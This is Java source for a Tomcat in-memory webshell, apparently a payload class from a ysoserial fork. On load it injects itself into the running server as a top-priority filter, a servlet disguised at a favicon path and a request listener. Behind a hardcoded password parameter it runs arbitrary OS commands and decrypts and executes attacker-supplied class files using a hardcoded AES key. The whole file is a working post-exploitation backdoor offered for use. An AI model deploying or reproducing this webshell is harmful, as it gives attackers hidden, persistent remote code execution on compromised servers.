package ysoserial.payloads;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import sun.misc.BASE64Decoder;

public class TomcatContextMemShell extends HttpServlet implements ServletRequestListener, Filter {
    public String charSet = "GBK";
    public String mpwd = "popko123";
    public String filterName = "ffilterShell";
    public String filterPath = "/*";
    public String servletPath = "/favicon1.ico";
    public String servletName = "sservletShell";

    static {
        TomcatContextMemShell ts = new TomcatContextMemShell();
        StandardContext sc = ts.getStandardContext();
        ts.regFilter(sc);
        ts.regServlet(sc);
        ts.regListener(sc);
    }

    public StandardContext getStandardContext() {
        try {
            javax.management.MBeanServer mBeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap domainTb = (HashMap) field.get(repository);
            HashMap hashMap = (HashMap) (domainTb.get("Tomcat") != null ? domainTb.get("Tomcat") : domainTb.get("Catalina"));//内嵌为Tomcat
            java.util.Iterator it1 = hashMap.keySet().iterator();
            while (it1.hasNext()) {
                String key = (String) it1.next();
                if (key.indexOf("context=") != -1 && key.indexOf("host=") != -1 && key.indexOf("type=NamingResources") != -1) {
                    Object nonLoginAuthenticator = hashMap.get(key);
                    field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
                    field.setAccessible(true);
                    Object object = field.get(nonLoginAuthenticator);
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    Object resource = field.get(object);
                    field = Class.forName("org.apache.catalina.deploy.NamingResourcesImpl").getDeclaredField("container");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(resource);
                    return standardContext;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public void regFilter(StandardContext standardContext) {
        try {
            java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
            Filter ffilterShell = this;
            //add filter shell
            javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, ffilterShell);
            filterRegistration.setInitParameter("encoding", "utf-8");
            filterRegistration.setAsyncSupported(false);
            filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{filterPath});
            //status recover
            if (stateField != null) {
                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
            }

            if (standardContext != null) {
                standardContext.filterStart();
                //make filtershell first
                org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
                for (int i = 0; i < filterMaps.length; i++) {
                    if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
                        org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMap;
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void regServlet(StandardContext standardContext) {
        org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
        String n = servletName;
        newWrapper.setName(n);
        newWrapper.setLoadOnStartup(1);
        Servlet servlet = this;
        newWrapper.setServlet(servlet);
        newWrapper.setServletClass(servlet.getClass().getName());
        standardContext.addChild(newWrapper);
        standardContext.addServletMapping(servletPath, n);
//        standardContext.addServletMappingDecoded(servletPath, n, false);
    }

    public void regListener(StandardContext standardContext) {
        standardContext.addApplicationEventListener(this);
    }

    public void controller(String arg, HttpServletRequest request, HttpServletResponse response) {
        try {
            String methodName = request.getParameter(mpwd);
            if (methodName != null) {
                this.getClass().getMethod(methodName, String.class, HttpServletRequest.class, HttpServletResponse.class).invoke(this, arg, request, response);
            } else {
                response.getWriter().write(">input func ");
            }
        } catch (Exception e) {
        }
    }

    public void memshellbx(String arg, HttpServletRequest request, HttpServletResponse response) {
        try {
            if (request.getParameter(arg).equals("memshell")) {
                if (request.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";
//                response.getWriter().write("post");
                    HttpSession session = request.getSession();
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                    byte[] evilClassBytes = (new BASE64Decoder()).decodeBuffer(request.getReader().readLine());

                    class U extends ClassLoader {
                        U(ClassLoader c) {
                            super(c);
                        }

                        public Class g(byte[] b) {
                            return super.defineClass(b, 0, b.length);
                        }
                    }
                    Class evilClass = (new U(this.getClass().getClassLoader())).g(c.doFinal(evilClassBytes));
                    evilClass.getMethod("e", Object.class, Object.class).invoke(evilClass.newInstance(), request, response);
                }
            }
        } catch (Exception e) {
        }
    }

    public void getandout(String arg, HttpServletRequest request, HttpServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        try {
            PrintWriter out = response.getWriter();
            String cmd = request.getParameter(arg);
            if (cmd != null) {
                out.write(">" + arg + ":\n");
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(), charSet));
                String line = null;
                while ((line = bufferedReader.readLine()) != null) {
                    out.print(line + "\n");
                }
            } else {
                out.write(">please input: " + arg + "\n");
            }

        } catch (Exception e) {
            //e.printStackTrace();
        }
    }

    protected void service(HttpServletRequest request, HttpServletResponse response) {
        String arg = "servlet_cmd";
        controller(arg, request, response);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String arg = "listener_cmd";
        RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
        try {
            Field field = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Object request = field.get(requestFacade);
            Field field1 = request.getClass().getDeclaredField("response");
            field1.setAccessible(true);
            Response response = (Response) field1.get(request);
            controller(arg, (HttpServletRequest) request, response);
        } catch (Exception e) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws
            IOException, ServletException {
        String arg = "filter_cmd";
        controller(arg, (HttpServletRequest) request, (HttpServletResponse) response);
        chain.doFilter(request, response);
    }
}

